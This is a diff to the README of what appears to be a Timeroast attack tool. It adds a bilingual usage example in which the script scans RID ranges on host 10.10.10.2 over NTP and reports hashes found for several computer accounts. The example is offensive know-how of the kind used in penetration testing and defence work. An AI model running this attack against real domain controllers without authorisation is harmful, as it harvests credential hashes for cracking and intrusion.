@@ -16,3 +16,32 @@ Run the following command from your host, specifying the argument `-f` for the d
 ```
 python3 timeroast_gis.py -f file.txt -o export.txt
 ```
+
+## Пример работы / Example of work
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ python3 timeroast_gis.py -f file.txt -o export.txt
+
+     ██████  ██ ███████  ███████ ██    ██ ██████  ███████  ██████  ████████ ███████    ██     ███    ███ 
+    ██       ██ ██       ██       ██  ██  ██   ██ ██       ██   ██    ██    ██       ██  ██   ████  ████ 
+    ██   ███ ██ ███████  ██         ██    █████   █████    ██████     ██    █████   ██    ██  ██ ████ ██ 
+    ██    ██ ██      ██  ██         ██    ██   ██ ██       ██   ██    ██    ██      ████████  ██  ██  ██ 
+     ██████  ██ ███████  ███████    ██    ███████ ███████  ██   ██    ██    ███████ ██    ██  ██      ██ 
+    
+Starting NTP Timeroast attack...
+
+[+] Processing host 1/1: 10.10.10.2
+    Checking RIDs 0-29999...
+    Finished checking RIDs 0-29999.
+
+    Checking RIDs 30000-59999...
+    Finished checking RIDs 30000-59999.
+
+    Checking RIDs 60000-89999...
+        Found hash for RID 60018
+        Found hash for RID 60027
+        Found hash for RID 60061
+        Found hash for RID 60062
+        Found hash for RID 60069
+        Found hash for RID 60070
+```
